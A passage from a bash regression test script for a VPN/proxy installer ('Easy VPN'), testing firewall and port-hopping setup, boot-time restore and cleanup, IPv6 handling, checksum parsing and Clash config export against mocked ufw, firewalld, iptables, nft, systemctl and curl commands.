[[ "$fallback_digest" == "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ]] || fail "GitHub HTML checksum fallback returned wrong digest"

# 3/4. Exercise firewall_rule_exists and service-profile safeguard against mocked UFW/firewalld.
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"
  ufw() {
    case "$1" in
      status) printf "%s\n" "Status: active" "" "To                         Action      From" "OpenSSH                    ALLOW IN    Anywhere" "80/tcp                     ALLOW IN    Anywhere" "OpenSSH (v6)               ALLOW IN    Anywhere (v6)" "80/tcp (v6)                ALLOW IN    Anywhere (v6)" ;;
      app) [[ "${2:-}" == info && "${3:-}" == OpenSSH ]] || return 2; printf "%s\n" "Profile: OpenSSH" "Ports: 22/tcp 2200:2210/tcp" ;;
      *) return 1 ;;
    esac
  }
  firewall-cmd() {
    case "$1" in
      --get-default-zone) echo public ;;
      --query-port=443/tcp) return 1 ;;
      --query-port=80/tcp) return 0 ;;
      --permanent)
        if [[ "${2:-}" == --zone=public && "${3:-}" == --list-services ]]; then echo "ssh https"; return 0; fi
        return 1 ;;
      --info-service=ssh) printf "%s\n" "ssh" "  ports: 22/tcp 2200-2210/tcp" ;;
      --info-service=https) printf "%s\n" "https" "  ports: 443/tcp" ;;
      *) return 1 ;;
    esac
  }
  firewall_rule_exists ufw 80 tcp || exit 11
  firewall_port_has_service_rule ufw 22 tcp || exit 12
  firewall_port_has_service_rule ufw 2205 tcp || exit 13
  if firewall_port_has_service_rule ufw 443 tcp; then exit 14; fi
  firewall_rule_exists firewalld 80 tcp || exit 15
  firewall_port_has_service_rule firewalld 443 tcp || exit 16
  firewall_port_has_service_rule firewalld 2205 tcp || exit 17
  if firewall_port_has_service_rule firewalld 8443 tcp; then exit 18; fi
' _ "$ROOT" || fail "firewall checks / service-rule protection failed"

# Issue 2: allow the standard UFW IPv4 + IPv6 pair, while rejecting duplicate IPv4 entries.
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"
  deleted="$2/deleted"
  ufw() {
    case "$1" in
      status)
        if [[ "${2:-}" == numbered ]]; then
          printf "%s\n" "[ 1] 20000/udp ALLOW IN Anywhere" "[ 2] 20000/udp (v6) ALLOW IN Anywhere (v6)"
        else
          printf "%s\n" "Status: active" "20000/udp ALLOW IN Anywhere" "20000/udp (v6) ALLOW IN Anywhere (v6)"
        fi ;;
      --force) [[ "${2:-}" == delete && "${3:-}" == allow ]] || return 1; printf "%s\n" "$*" >> "$deleted"; return 0 ;;
      app) return 1 ;;
      *) return 1 ;;
    esac
  }
  firewall_remove_owned_rule ufw 20000 udp || exit 31
  grep -q "delete allow 20000/udp" "$deleted" || exit 32
  ufw() {
    case "$1" in
      status)
        if [[ "${2:-}" == numbered ]]; then
          printf "%s\n" "[ 1] 20000/udp ALLOW IN Anywhere" "[ 2] 20000/udp ALLOW IN 1.2.3.4"
        else
          printf "%s\n" "Status: active" "20000/udp ALLOW IN Anywhere" "20000/udp ALLOW IN 1.2.3.4"
        fi ;;
      app) return 1 ;;
      *) return 1 ;;
    esac
  }
  if firewall_remove_owned_rule ufw 20000 udp >/dev/null 2>&1; then exit 33; fi
' _ "$ROOT" "$regression_test" || fail "UFW dual-stack cleanup safeguard failed"

# Issue 3: firewalld range operations reload once; iptables rules restore via Easy VPN's own systemd unit.
batch_test="$regression_test/batch"
mkdir -p "$batch_test/bin" "$batch_test/root" "$batch_test/etc" "$batch_test/state" "$batch_test/backups"
cat > "$batch_test/bin/firewall-cmd" <<'MOCK_FW'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$FW_LOG"
case "$1" in
  --state) echo running; exit 0 ;;
  --get-default-zone) echo public; exit 0 ;;
  --query-port=*) grep -Fxq "${1#--query-port=}" "$FW_STATE" 2>/dev/null; exit $? ;;
  --permanent)
    case "${2:-}" in
      --zone=public) [[ "${3:-}" == --list-services ]] && { echo ""; exit 0; } ;;
      --list-ports) tr '\n' ' ' < "$FW_STATE" 2>/dev/null; exit 0 ;;
      --add-port=*) printf '%s\n' "${2#--add-port=}" >> "$FW_STATE"; exit 0 ;;
      --remove-port=*)
        [[ "${FW_FAIL_REMOVE_PORT:-}" == "${2#--remove-port=}" ]] && exit 1
        grep -Fxv "${2#--remove-port=}" "$FW_STATE" > "${FW_STATE}.tmp" 2>/dev/null || true
        mv -f "${FW_STATE}.tmp" "$FW_STATE"; exit 0 ;;
    esac ;;
  --reload) exit 0 ;;
esac
exit 1
MOCK_FW
cat > "$batch_test/bin/iptables" <<'MOCK_IPTABLES'
#!/usr/bin/env bash
set -u
if [[ "${0##*/}" == ip6tables ]]; then STATE_DIR="$IPT6_STATE_DIR"; else STATE_DIR="$IPT_STATE_DIR"; fi
printf '%s\n' "$*" >> "$IPTABLES_LOG"
[[ "${1:-}" == -t && "${2:-}" == nat ]] || exit 2
shift 2
action="${1:-}"; shift || true
mkdir -p "$STATE_DIR"
case "$action" in
  -S)
    chain="${1:-}"
    [[ "$chain" == PREROUTING ]] || exit 1
    touch "$STATE_DIR/PREROUTING"
    while IFS= read -r rule; do [[ -n "$rule" ]] && printf '%s\n' "-A $rule"; done < "$STATE_DIR/PREROUTING"
    ;;
  -L)
    chain="${1:-}"
    if [[ "$chain" == PREROUTING ]]; then touch "$STATE_DIR/PREROUTING"; fi
    [[ -f "$STATE_DIR/$chain" ]] || exit 1
    echo "Chain $chain (0 references)"
    ;;
  -N)
    chain="${1:-}"
    [[ ! -e "$STATE_DIR/$chain" ]] || exit 1
    : > "$STATE_DIR/$chain"
    ;;
  -F)
    chain="${1:-}"
    [[ -f "$STATE_DIR/$chain" ]] || exit 1
    : > "$STATE_DIR/$chain"
    ;;
  -X)
    chain="${1:-}"
    [[ -f "$STATE_DIR/$chain" && ! -s "$STATE_DIR/$chain" ]] || exit 1
    rm -f "$STATE_DIR/$chain"
    ;;
  -C|-A|-D)
    chain="${1:-}"; shift || true
    rule="$chain $*"
    state_file="$STATE_DIR/$chain"
    [[ -f "$state_file" ]] || { [[ "$action" == -A && "$chain" == PREROUTING ]] || exit 1; : > "$state_file"; }
    case "$action" in
      -C) grep -Fxq "$rule" "$state_file" ;;
      -A) printf '%s\n' "$rule" >> "$state_file" ;;
      -D)
        grep -Fxq "$rule" "$state_file" || exit 1
        awk -v target="$rule" 'BEGIN { removed=0 } $0==target && !removed { removed=1; next } { print }' "$state_file" > "$state_file.tmp"
        mv "$state_file.tmp" "$state_file"
        ;;
    esac
    ;;
  *) exit 2 ;;
esac
MOCK_IPTABLES
cp "$batch_test/bin/iptables" "$batch_test/bin/ip6tables"
cat > "$batch_test/bin/systemctl" <<'MOCK_SYSTEMCTL'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$SYSTEMCTL_LOG"
case "${1:-}" in
  restart|start)
    if [[ "${2:-}" == easy-vpn-port-hop.service && -x "${EASY_VPN_ROOT}/bin/easy-vpn-port-hop-restore" ]]; then
      "${EASY_VPN_ROOT}/bin/easy-vpn-port-hop-restore" apply-all || exit $?
      touch "$SYSTEMCTL_ACTIVE"
    fi ;;
  stop) rm -f "$SYSTEMCTL_ACTIVE" ;;
  is-active) [[ -f "$SYSTEMCTL_ACTIVE" ]] ;;
  is-enabled) exit 0 ;;
esac
exit 0
MOCK_SYSTEMCTL
chmod 755 "$batch_test/bin/firewall-cmd" "$batch_test/bin/iptables" "$batch_test/bin/ip6tables" "$batch_test/bin/systemctl"
PATH="$batch_test/bin:$PATH" FW_LOG="$batch_test/fw.log" FW_STATE="$batch_test/fw.state" IPTABLES_LOG="$batch_test/iptables.log" IPT_STATE_DIR="$batch_test/iptables.state" IPT6_STATE_DIR="$batch_test/ip6tables.state" SYSTEMCTL_LOG="$batch_test/systemctl.log" SYSTEMCTL_ACTIVE="$batch_test/systemctl.active" \
EASY_VPN_ROOT="$batch_test/root" EASY_VPN_ETC="$batch_test/etc" \
EASY_VPN_SYSTEMD_DIR="$batch_test/systemd" \
EASY_VPN_STATE="$batch_test/state" EASY_VPN_BACKUPS="$batch_test/backups" EASY_VPN_LOG="$batch_test/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  command_exists() { [[ "$1" != nft ]] && command -v "$1" >/dev/null 2>&1; }
  ufw() { return 1; }
  hop_range_conflicts() { return 1; }
  setup_port_hopping hy2 22000-22002 8443 || exit 41
  [[ $(grep -c "^--reload$" "$FW_LOG") -eq 1 ]] || exit 42
  grep -q "Wants=easy-vpn-port-hop.service" "$EASY_VPN_SYSTEMD_DIR/easy-vpn-sing-box.service.d/30-easy-vpn-port-hop.conf" || exit 46
  ! grep -q "Requires=easy-vpn-port-hop.service" "$EASY_VPN_SYSTEMD_DIR/easy-vpn-sing-box.service.d/30-easy-vpn-port-hop.conf" || exit 47
  [[ -f "$EASY_VPN_ETC/port-hop/hy2.iptables" ]] || exit 48
  bash -n "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" || exit 54
  grep -q "^format=easy-vpn-port-hop-v2$" "$EASY_VPN_ETC/port-hop/hy2.iptables" || exit 49
  grep -q "^ipv4=1$" "$EASY_VPN_ETC/port-hop/hy2.iptables" || exit 490
  grep -q "^ipv6=1$" "$EASY_VPN_ETC/port-hop/hy2.iptables" || exit 491
  [[ $(wc -l < "$EASY_VPN_ETC/port-hop/hy2.firewall") -eq 1 ]] || exit 58
  grep -Fxq "firewalld|22000-22002|udp" "$EASY_VPN_ETC/port-hop/hy2.firewall" || exit 59
  [[ ! -e "$EASY_VPN_STATE/firewall/udp_22000.rule" && ! -e "$EASY_VPN_STATE/firewall/udp_22001.rule" && ! -e "$EASY_VPN_STATE/firewall/udp_22002.rule" ]] || exit 62
  [[ $(grep -Fc -- "--add-port=22000-22002/udp" "$FW_LOG") -eq 1 ]] || exit 610
  grep -Fxq "PREROUTING -p udp --dport 22000:22002 -j EASY_VPN_HOP_HY2" "$IPT_STATE_DIR/PREROUTING" || exit 50
  grep -Fxq "PREROUTING -p udp --dport 22000:22002 -j EASY_VPN_HOP_HY2" "$IPT6_STATE_DIR/PREROUTING" || exit 501
  grep -Fxq "EASY_VPN_HOP_HY2 -p udp -j REDIRECT --to-ports 8443" "$IPT6_STATE_DIR/EASY_VPN_HOP_HY2" || exit 502
  # Simulate reboot: kernel tables disappear but persisted state and the systemd helper remain.
  rm -rf "$IPT_STATE_DIR" "$IPT6_STATE_DIR"; mkdir -p "$IPT_STATE_DIR" "$IPT6_STATE_DIR"
  "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" apply-all || exit 51
  grep -Fxq "PREROUTING -p udp --dport 22000:22002 -j EASY_VPN_HOP_HY2" "$IPT_STATE_DIR/PREROUTING" || exit 52
  grep -Fxq "PREROUTING -p udp --dport 22000:22002 -j EASY_VPN_HOP_HY2" "$IPT6_STATE_DIR/PREROUTING" || exit 521
  "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" apply-all || exit 55
  [[ $(grep -Fc "PREROUTING -p udp --dport 22000:22002 -j EASY_VPN_HOP_HY2" "$IPT_STATE_DIR/PREROUTING") -eq 1 ]] || exit 56
  # Partial host-firewall cleanup failure must retain the whole ownership manifest,
  # but once the NAT jump is removed its persistence file must not re-enable it on reboot.
  if FW_FAIL_REMOVE_PORT=22000-22002/udp remove_port_hopping hy2; then exit 63; fi
  [[ -f "$EASY_VPN_ETC/port-hop/hy2.firewall" ]] || exit 64
  [[ $(wc -l < "$EASY_VPN_ETC/port-hop/hy2.firewall") -eq 1 ]] || exit 65
  [[ ! -e "$EASY_VPN_ETC/port-hop/hy2.iptables" ]] || exit 67
  rm -rf "$IPT_STATE_DIR" "$IPT6_STATE_DIR"; mkdir -p "$IPT_STATE_DIR" "$IPT6_STATE_DIR"
  "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" apply-all || exit 68
  [[ ! -e "$IPT_STATE_DIR/PREROUTING" && ! -e "$IPT_STATE_DIR/EASY_VPN_HOP_HY2" ]] || exit 69
  [[ ! -e "$IPT6_STATE_DIR/PREROUTING" && ! -e "$IPT6_STATE_DIR/EASY_VPN_HOP_HY2" ]] || exit 691
  remove_port_hopping hy2 || exit 43
  [[ $(grep -c "^--reload$" "$FW_LOG") -eq 2 ]] || exit 44
  [[ ! -s "$FW_STATE" ]] || exit 45
  [[ ! -e "$EASY_VPN_ETC/port-hop/hy2.iptables" ]] || exit 53
  [[ ! -e "$EASY_VPN_ETC/port-hop/hy2.firewall" ]] || exit 66
  [[ ! -e "$EASY_VPN_STATE/firewall/udp_22000.rule" && ! -e "$EASY_VPN_STATE/firewall/udp_22001.rule" && ! -e "$EASY_VPN_STATE/firewall/udp_22002.rule" ]] || exit 57
' _ "$ROOT" || fail "firewalld batching / iptables boot restore / removal failed"

# IPv6 must never be silently routed through an IPv4-only iptables backend.
ipv6_guard="$regression_test/ipv6-guard"
mkdir -p "$ipv6_guard/root" "$ipv6_guard/etc" "$ipv6_guard/state" "$ipv6_guard/backups"
EASY_VPN_ROOT="$ipv6_guard/root" EASY_VPN_ETC="$ipv6_guard/etc" \
EASY_VPN_STATE="$ipv6_guard/state" EASY_VPN_BACKUPS="$ipv6_guard/backups" EASY_VPN_LOG="$ipv6_guard/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  command_exists() { [[ "$1" == iptables ]] || { [[ "$1" != nft ]] && command -v "$1" >/dev/null 2>&1; }; }
  if setup_port_hopping hy2 23000-23002 8443 "2001:db8::1"; then exit 71; fi
  [[ ! -e "$EASY_VPN_ETC/port-hop/hy2.iptables" && ! -e "$EASY_VPN_ETC/port-hop/hy2.nft" ]] || exit 72
' _ "$ROOT" || fail "IPv6 endpoint improperly selected IPv4-only iptables hop rules"

# IPv6-only iptables backend must use ip6tables when its NAT table is available.
ipv6_only_test="$regression_test/ipv6-only"
mkdir -p "$ipv6_only_test/root" "$ipv6_only_test/etc" "$ipv6_only_test/state" "$ipv6_only_test/backups"
PATH="$batch_test/bin:$PATH" IPTABLES_LOG="$batch_test/iptables.log" IPT_STATE_DIR="$ipv6_only_test/ip4-state" \
IPT6_STATE_DIR="$ipv6_only_test/ip6-state" SYSTEMCTL_LOG="$ipv6_only_test/systemctl.log" SYSTEMCTL_ACTIVE="$ipv6_only_test/systemctl.active" \
EASY_VPN_ROOT="$ipv6_only_test/root" EASY_VPN_ETC="$ipv6_only_test/etc" EASY_VPN_SYSTEMD_DIR="$ipv6_only_test/systemd" \
EASY_VPN_STATE="$ipv6_only_test/state" EASY_VPN_BACKUPS="$ipv6_only_test/backups" EASY_VPN_LOG="$ipv6_only_test/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  command_exists() { [[ "$1" != nft ]] && command -v "$1" >/dev/null 2>&1; }
  firewall_backend() { echo none; }
  firewall_allow() { return 0; }
  hop_range_conflicts() { return 1; }
  systemctl() {
    if [[ "${1:-}" == restart && "${2:-}" == easy-vpn-port-hop.service ]]; then
      "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" apply-all || return $?
    fi
    return 0
  }
  setup_port_hopping hy2 24000-24002 443 "[2001:db8::1]" || exit 121
  grep -Fxq "format=easy-vpn-port-hop-v2" "$EASY_VPN_ETC/port-hop/hy2.iptables" || exit 122
  grep -Fxq "ipv4=0" "$EASY_VPN_ETC/port-hop/hy2.iptables" || exit 123
  grep -Fxq "ipv6=1" "$EASY_VPN_ETC/port-hop/hy2.iptables" || exit 124
  grep -Fxq "EASY_VPN_HOP_HY2 -p udp -j REDIRECT --to-ports 443" "$IPT6_STATE_DIR/EASY_VPN_HOP_HY2" || exit 125
  remove_port_hopping hy2 || exit 126
  [[ ! -e "$IPT6_STATE_DIR/EASY_VPN_HOP_HY2" ]] || exit 127
' _ "$ROOT" || fail "IPv6-only ip6tables port-hop setup/cleanup failed"

# Additional regression: nft hopping creates a boot restore unit, restores after a simulated reboot,
# and cleanup leaves any pre-existing/unowned firewall allowances untouched.
nft_lifecycle="$regression_test/nft-lifecycle"
mkdir -p "$nft_lifecycle/bin" "$nft_lifecycle/root" "$nft_lifecycle/etc" "$nft_lifecycle/state" "$nft_lifecycle/backups" "$nft_lifecycle/systemd"
cat > "$nft_lifecycle/bin/nft" <<'MOCK_NFT'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$NFT_LOG"
case "$1" in
  -c) exit 0 ;;
  list)
    table="${4:-}"
    if grep -Fxq "$table" "$NFT_TABLES" 2>/dev/null; then
      printf 'table %s %s {\n}\n' "${3:-ip}" "$table"
      exit 0
    fi
    exit 1
    ;;
  delete)
    table="${4:-}"
    grep -Fxv "$table" "$NFT_TABLES" > "${NFT_TABLES}.tmp" 2>/dev/null || true
    mv -f "${NFT_TABLES}.tmp" "$NFT_TABLES"
    exit 0
    ;;
  -f)
    file="${2:-}"
    if [[ "${NFT_FAIL_LIVE_LOAD:-0}" == 1 && "$file" == */hy2.nft ]]; then exit 1; fi
    table=$(awk '/^[[:space:]]*table[[:space:]]+(ip|inet)[[:space:]]+/ {print $3; exit}' "$file" 2>/dev/null)
    [[ -n "$table" ]] || exit 1
    grep -Fxq "$table" "$NFT_TABLES" 2>/dev/null || printf '%s\n' "$table" >> "$NFT_TABLES"
    exit 0
    ;;
esac
exit 1
MOCK_NFT
cat > "$nft_lifecycle/bin/systemctl" <<'MOCK_SYSTEMCTL'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "$SYSTEMCTL_LOG"
case "$1" in
  restart|start)
    if [[ "${2:-}" == easy-vpn-port-hop.service && -x "${EASY_VPN_ROOT}/bin/easy-vpn-port-hop-restore" ]]; then
      "${EASY_VPN_ROOT}/bin/easy-vpn-port-hop-restore" apply-all || exit $?
      touch "$SYSTEMCTL_ACTIVE"
    fi
    ;;
  stop) rm -f "$SYSTEMCTL_ACTIVE" ;;
  is-active) [[ -f "$SYSTEMCTL_ACTIVE" ]]; exit $? ;;
  is-enabled) exit 0 ;;
esac
exit 0
MOCK_SYSTEMCTL
chmod 755 "$nft_lifecycle/bin/nft" "$nft_lifecycle/bin/systemctl"
: > "$nft_lifecycle/nft.tables"
PATH="$nft_lifecycle/bin:$PATH" NFT_LOG="$nft_lifecycle/nft.log" NFT_TABLES="$nft_lifecycle/nft.tables" SYSTEMCTL_LOG="$nft_lifecycle/systemctl.log" SYSTEMCTL_ACTIVE="$nft_lifecycle/systemctl.active" UFW_LOG="$nft_lifecycle/ufw.log" \
EASY_VPN_ROOT="$nft_lifecycle/root" EASY_VPN_ETC="$nft_lifecycle/etc" \
EASY_VPN_STATE="$nft_lifecycle/state" EASY_VPN_BACKUPS="$nft_lifecycle/backups" EASY_VPN_LOG="$nft_lifecycle/log" \
EASY_VPN_SYSTEMD_DIR="$nft_lifecycle/systemd" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  firewall_backend() { echo ufw; }
  ufw() {
    case "$1" in
      status) printf "%s\n" "Status: active" "22000/udp ALLOW IN Anywhere" "22001/udp ALLOW IN Anywhere" "22002/udp ALLOW IN Anywhere" ;;
      app) return 1 ;;
      *) printf "%s\n" "$*" >> "$UFW_LOG"; return 1 ;;
    esac
  }
  hop_range_conflicts() { return 1; }
  # Simulate a 1.0.5 installation: the .nft file/state exist, but no boot restore unit exists yet.
  file=$(write_hop_persistence_file hy2 nft 22000-22002 8443) || exit 70
  # Model an older install: IPv4-only table under the legacy vps_tool name.
  sed -i "s/table inet easy_vpn_hop_hy2/table ip vps_tool_hop_hy2/" "$file"
  state_set "$(protocol_hop_state_key hy2)" 22000-22002
  state_set "$(protocol_hop_backend_state_key hy2)" nft
  state_set "$(protocol_hop_listen_state_key hy2)" 8443
  migrate_existing_nft_hopping || exit 71
  [[ -f "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" ]] || exit 72
  bash -n "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" || exit 88
  [[ -f "$EASY_VPN_SYSTEMD_DIR/easy-vpn-port-hop.service" ]] || exit 73
  [[ -f "$EASY_VPN_SYSTEMD_DIR/easy-vpn-sing-box.service.d/30-easy-vpn-port-hop.conf" ]] || exit 74
  grep -q "Wants=easy-vpn-port-hop.service" "$EASY_VPN_SYSTEMD_DIR/easy-vpn-sing-box.service.d/30-easy-vpn-port-hop.conf" || exit 75
  ! grep -q "Requires=easy-vpn-port-hop.service" "$EASY_VPN_SYSTEMD_DIR/easy-vpn-sing-box.service.d/30-easy-vpn-port-hop.conf" || exit 76
  if command -v systemd-analyze >/dev/null 2>&1; then
    systemd-analyze verify "$EASY_VPN_SYSTEMD_DIR/easy-vpn-port-hop.service" >/dev/null 2>&1 || exit 87
  fi
  grep -Fxq vps_tool_hop_hy2 "$NFT_TABLES" || exit 76
  # Simulate kernel rules being empty after reboot; the helper restores from the persisted legacy .nft file.
  : > "$NFT_TABLES"
  "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" apply-all || exit 77
  grep -Fxq vps_tool_hop_hy2 "$NFT_TABLES" || exit 78
  # A second restore must remain idempotent and not duplicate table records.
  "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" apply-all || exit 89
  [[ $(grep -Fc vps_tool_hop_hy2 "$NFT_TABLES") -eq 1 ]] || exit 90
  # Force a new file load to fail; the helper must put the previous live table back.
  sed -i "s/redirect to :8443/redirect to :8444/" "$file"
  if NFT_FAIL_LIVE_LOAD=1 "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" apply-file "$file"; then exit 79; fi
  grep -Fxq vps_tool_hop_hy2 "$NFT_TABLES" || exit 80
  sed -i "s/redirect to :444/redirect to :443/" "$file"
  # Existing UFW rules are not owned by Easy VPN and therefore must not be deleted or treated as an error.
  remove_port_hopping hy2 || exit 81
  [[ ! -s "$NFT_TABLES" ]] || exit 82
  [[ ! -e "$EASY_VPN_ROOT/bin/easy-vpn-port-hop-restore" ]] || exit 83
  [[ ! -e "$EASY_VPN_SYSTEMD_DIR/easy-vpn-port-hop.service" ]] || exit 84
  [[ ! -e "$EASY_VPN_SYSTEMD_DIR/easy-vpn-sing-box.service.d/30-easy-vpn-port-hop.conf" ]] || exit 85
  [[ ! -s "$UFW_LOG" ]] || exit 86
' _ "$ROOT" || fail "nft boot-persistence / unowned firewall cleanup test failed"

# 5. Ctrl-D at the UDP prompt must cancel cleanly before rollback_dir is created.
for deploy_fn in deploy_hysteria2 deploy_tuic_v5; do
    cancel_output=$(EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
        EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
        bash -c 'source "$1/lib/common.sh"; source "$1/modules/protocol.sh"; clear(){ :; }; get_random_protocol_port(){ echo 54321; }; "$2" </dev/null || true' _ "$ROOT" "$deploy_fn" 2>&1) || fail "EOF cancel test subprocess failed: $deploy_fn"
    grep -q '未读取到端口输入' <<< "$cancel_output" || fail "EOF cancellation message missing: $deploy_fn"
    ! grep -q 'unbound variable' <<< "$cancel_output" || fail "EOF cancellation expands uninitialized rollback_dir: $deploy_fn"
done

# 6. Both checksum formats must parse with LF and CRLF endings.
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  asset=sing-box-1.2.3-linux-amd64.tar.gz
  hash=$(printf "A%.0s" {1..64})
  printf "%s *%s\r\n" "$hash" "$asset" > "$2/gnu-crlf.txt"
  printf "SHA256 (%s) = %s\r\n" "$asset" "$hash" > "$2/bsd-crlf.txt"
  [[ "$(extract_singbox_checksum "$2/gnu-crlf.txt" "$asset")" == "$hash" ]] || exit 21
  [[ "$(extract_singbox_checksum "$2/bsd-crlf.txt" "$asset")" == "$hash" ]] || exit 22
  printf "%s *%s\n" "$hash" "$asset" > "$2/gnu-lf.txt"
  printf "SHA256 (%s) = %s\n" "$asset" "$hash" > "$2/bsd-lf.txt"
  [[ "$(extract_singbox_checksum "$2/gnu-lf.txt" "$asset")" == "$hash" ]] || exit 23
  [[ "$(extract_singbox_checksum "$2/bsd-lf.txt" "$asset")" == "$hash" ]] || exit 24
' _ "$ROOT" "$regression_test" || fail "checksum parser failed for LF/CRLF"

# 7. TCP buffer warning threshold must be computed in bytes and must not reference removed modules.
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  [[ $((128 * 1024 * 1024 / 8)) -eq 16777216 ]] || exit 51
  grep -Fq "threshold=\$((mem_mb * 1024 * 1024 / 8))" "$1/modules/protocol.sh" || exit 52
  ! grep -q "模块 3 的低内存适配" "$1/modules/protocol.sh" || exit 53
  grep -q "/etc/sysctl.conf.*net.ipv4.tcp_wmem" "$1/modules/protocol.sh" || exit 54
' _ "$ROOT" || fail "TCP buffer threshold / warning wording regression"

# 8. TUIC deployment and Clash/Mihomo exports must not advertise unsupported port hopping.
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
EASY_VPN_CONF_DIR="$regression_test/etc/sing-box" \
EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  awk "/^deploy_tuic_v5\(\)/,/^remove_protocol\(\)/" "$1/modules/protocol.sh" > "$2/tuic-deploy-body"
  ! grep -Eq "prompt_port_hopping|setup_port_hopping|mport=|hop_range" "$2/tuic-deploy-body" || exit 61
  ! grep -Fq "if [[ -n \"\$hop_range\" && \"\$server_ip\" == *:* ]]; then" "$1/modules/protocol.sh" || exit 64
  mkdir -p "$CONF_DIR"
  cat > "$CONF_DIR/node_info_tuic.txt" <<NODE
协议方案: TUIC v5
服务器地址: 192.0.2.10
UDP 端口: 443
用户 ID (UUID): 00000000-0000-4000-8000-000000000001
连接密码: test-password
SNI: example.com
NODE
  state_set protocol_tuic 1
  state_set "$(protocol_hop_state_key tuic)" 20000-20100
  generate_clash_yaml >/dev/null || exit 62
  ! grep -Eq "^[[:space:]]+ports:" "$CONF_DIR/clash.yaml" || exit 63
' _ "$ROOT" "$regression_test" || fail "TUIC hop prompt/export regression"

# 11. IPv6 share-link brackets must be removed from all Clash/Mihomo server fields.
EASY_VPN_ROOT="$regression_test/root" EASY_VPN_ETC="$regression_test/etc" \
EASY_VPN_CONF_DIR="$regression_test/etc/sing-box" \
EASY_VPN_STATE="$regression_test/state" EASY_VPN_BACKUPS="$regression_test/backups" EASY_VPN_LOG="$regression_test/log" \
bash -c '
  source "$1/lib/common.sh"; source "$1/modules/protocol.sh"
  mkdir -p "$CONF_DIR"
  cat > "$CONF_DIR/node_info_vless.txt" <<NODE
协议方案: VLESS + Reality
服务器地址: [2001:db8::1]
连接端口: 443
用户 ID (UUID): 00000000-0000-4000-8000-000000000001
流控: 已关闭 Vision
SNI: example.com
PublicKey: abcdef
ShortId: 12345678
NODE
  state_set protocol_vless 1
  generate_clash_yaml >/dev/null || exit 111
  grep -Fq "server: \"2001:db8::1\"" "$CONF_DIR/clash.yaml" || exit 112
  ! grep -Fq "server: \"[2001:db8::1]\"" "$CONF_DIR/clash.yaml" || exit 113
' _ "$ROOT" || fail "IPv6 Clash server normalization regression"

# Exercise both update-check prompts without accessing the network or changing the install.
update_test=$(mktemp -d /tmp/easy-vpn-update-menu-test.XXXXXX)
mkdir -p "$update_test/mockbin" "$update_test/same" "$update_test/new" "$update_test/etc" "$update_test/state" "$update_test/backups"
cp "$ROOT/protocol_catalog.json" "$update_test/same/protocol_catalog.json"
cp "$ROOT/VERSION" "$update_test/same/VERSION"
printf '#!/usr/bin/env bash\nprintf "sing-box version 1.0.0\n"\n' > "$update_test/mockbin/sing-box"
cat > "$update_test/mockbin/curl" <<'MOCK_CURL'
#!/usr/bin/env bash
out=""; url=""
while (($#)); do
    case "$1" in
        -o) out="${2:-}"; shift 2 ;;
        http://*|https://*) url="$1"; shift ;;
        *) shift ;;
    esac
done
case "$url" in
    *protocol_catalog.json*) [[ -n "$out" ]] && cp "$MOCK_REMOTE_DIR/protocol_catalog.json" "$out" ;;
    */VERSION) [[ -n "$out" ]] && cp "$MOCK_REMOTE_DIR/VERSION" "$out" ;;
    *api.github.com*) printf '[]\n' ;;
    *) echo "unexpected mocked URL: $url" >&2; exit 1 ;;
esac
MOCK_CURL
chmod 755 "$update_test/mockbin/curl" "$update_test/mockbin/sing-box"
cp "$update_test/same/protocol_catalog.json" "$update_test/new/protocol_catalog.json"
IFS=. read -r update_major update_minor update_patch < "$ROOT/VERSION"
update_patch=$((update_patch + 1))
update_fixture_version="${update_major}.${update_minor}.${update_patch}"
jq --arg version "$update_fixture_version" '.tool_version = $version' "$update_test/new/protocol_catalog.json" > "$update_test/new/catalog.tmp"
mv "$update_test/new/catalog.tmp" "$update_test/new/protocol_catalog.json"
printf '%s\n' "$update_fixture_version" > "$update_test/new/VERSION"
